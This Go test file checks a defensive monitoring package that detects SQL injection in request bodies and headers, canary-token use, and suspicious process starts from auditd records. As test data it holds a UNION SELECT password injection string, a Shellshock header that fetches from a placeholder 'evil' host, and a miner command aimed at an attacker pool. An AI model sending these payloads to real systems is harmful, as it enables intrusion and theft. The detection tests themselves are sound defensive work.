package watch

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// The POST body is the real blind spot: it never reaches the web server log.
// The mirror sees it, and injection inside it is detected.
func TestMirrorDetectsInjectionInBody(t *testing.T) {
	events := []Event{}
	server := NewMirrorServer(MirrorConfig{}, nil, func(e Event) { events = append(events, e) })

	body := strings.NewReader(`{"login":"admin' UNION SELECT password FROM users --","pass":"x"}`)
	request := httptest.NewRequest(http.MethodPost, "/api/login", body)
	request.Header.Set("CF-Connecting-IP", "203.0.113.77")
	request.Header.Set("X-Original-URI", "/api/login")
	recorder := httptest.NewRecorder()

	server.handle(recorder, request)

	if len(events) != 1 {
		t.Fatalf("expected one event, got %+v", events)
	}
	if events[0].Kind != "sqli_union" || events[0].IP != "203.0.113.77" {
		t.Errorf("unexpected event: %+v", events[0])
	}
	if events[0].Details["where"] != "body" {
		t.Errorf("the place of the match is missing: %+v", events[0].Details)
	}
	if recorder.Code != http.StatusNoContent {
		t.Errorf("the mirror must answer immediately and briefly, got %d", recorder.Code)
	}
}

// Injection in a header is visible as well.
func TestMirrorDetectsInjectionInHeader(t *testing.T) {
	events := []Event{}
	server := NewMirrorServer(MirrorConfig{}, nil, func(e Event) { events = append(events, e) })

	request := httptest.NewRequest(http.MethodGet, "/", nil)
	request.Header.Set("X-Forwarded-For", "198.51.100.3")
	request.Header.Set("User-Agent", "() { :; }; /bin/bash -c 'wget http://evil/x'")
	recorder := httptest.NewRecorder()

	server.handle(recorder, request)

	if len(events) != 1 || events[0].Details["where"] != "headers" {
		t.Fatalf("injection in a header was not noticed: %+v", events)
	}
}

// A canary token in the request body proves that someone read the server files.
func TestMirrorDetectsCanaryInBody(t *testing.T) {
	events := []Event{}
	canary := NewRuntimeCanary(NewCanary(CanaryConfig{Enabled: true, Tokens: []string{"CANARY_7f3b91e4d2"}}))
	server := NewMirrorServer(MirrorConfig{}, canary, func(e Event) { events = append(events, e) })

	request := httptest.NewRequest(http.MethodPost, "/api/login",
		strings.NewReader(`{"key":"CANARY_7f3b91e4d2"}`))
	server.handle(httptest.NewRecorder(), request)

	if len(events) != 1 || events[0].Kind != "canary_used" || events[0].Severity != SevAlert {
		t.Fatalf("the token in the body was not noticed: %+v", events)
	}
}

// An ordinary request produces no events.
func TestMirrorQuietOnNormalRequest(t *testing.T) {
	events := []Event{}
	server := NewMirrorServer(MirrorConfig{}, nil, func(e Event) { events = append(events, e) })

	request := httptest.NewRequest(http.MethodPost, "/service/buy",
		strings.NewReader(`{"packet_id":12,"count":1,"email":"user@example.com"}`))
	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	server.handle(httptest.NewRecorder(), request)

	if len(events) != 0 {
		t.Fatalf("an ordinary request must not raise an alarm: %+v", events)
	}
}

// auditd records: the kernel writes one event as several lines sharing an id,
// and they have to be parsed together.
func TestAuditWatcherGroupsRecords(t *testing.T) {
	events := []Event{}
	watcher := NewAuditWatcher(AuditConfig{}, func(e Event) { events = append(events, e) })

	// A real program start: three lines with id 456.
	watcher.Handle(`type=SYSCALL msg=audit(1793400000.123:456): arch=c000003e syscall=59 success=yes exit=0 ppid=1234 pid=4242 auid=1000 uid=0 tty=pts0 comm="miner" exe="/tmp/miner" key="sw_exec"`)
	watcher.Handle(`type=EXECVE msg=audit(1793400000.123:456): argc=3 a0="/tmp/miner" a1="--pool" a2="evil.example:3333"`)
	watcher.Handle(`type=CWD msg=audit(1793400000.123:456): cwd="/root"`)
	watcher.Handle(`type=EOE msg=audit(1793400000.123:456):`)

	if len(events) != 1 {
		t.Fatalf("three lines of one event must produce one event, got %d: %+v", len(events), events)
	}
	event := events[0]
	if event.Kind != "process_exec_from_temp" || event.Severity != SevAlert {
		t.Errorf("start from a temporary directory: %+v", event)
	}
	// This is what the grouping is for: these facts live in different lines.
	if event.Details["auid"] != "1000" || event.Details["ppid"] != "1234" {
		t.Errorf("the user and the parent were lost: %+v", event.Details)
	}
	if event.Details["cwd"] != "/root" {
		t.Errorf("the working directory was lost: %+v", event.Details)
	}
	if !strings.Contains(event.Details["cmdline"], "evil.example:3333") {
		t.Errorf("the command line was not assembled in full: %+v", event.Details)
	}
	if event.Details["success"] != "yes" {
		t.Errorf("the success flag was lost: %+v", event.Details)
	}
}

// Reading a canary file: the file is in the PATH record, the key is in SYSCALL.
func TestAuditWatcherCanaryRead(t *testing.T) {
	events := []Event{}
	watcher := NewAuditWatcher(AuditConfig{}, func(e Event) { events = append(events, e) })

	watcher.Handle(`type=SYSCALL msg=audit(1793400001.123:457): syscall=257 success=yes auid=1000 uid=1000 pid=4243 comm="cat" exe="/usr/bin/cat" key="sw_canary"`)
	watcher.Handle(`type=PATH msg=audit(1793400001.123:457): item=0 name="/opt/myapp/.env.backup" nametype=NORMAL`)
	watcher.Flush(0)

	if len(events) != 1 || events[0].Kind != "canary_file_read" {
		t.Fatalf("reading the canary file was not noticed: %+v", events)
	}
	if events[0].Subject != "/opt/myapp/.env.backup" {
		t.Errorf("the wrong file: %+v", events[0])
	}
	if events[0].Details["exe"] != "" && events[0].Details["comm"] != "cat" {
		t.Errorf("who did the reading was lost: %+v", events[0].Details)
	}
}

// Records with other keys are skipped.
func TestAuditWatcherIgnoresOtherKeys(t *testing.T) {
	events := []Event{}
	watcher := NewAuditWatcher(AuditConfig{}, func(e Event) { events = append(events, e) })

	watcher.Handle(`type=SYSCALL msg=audit(1793400002.123:458): key="other" exe="/usr/bin/ls" auid=0`)
	watcher.Flush(0)

	if len(events) != 0 {
		t.Fatalf("another key must produce no events: %+v", events)
	}
}
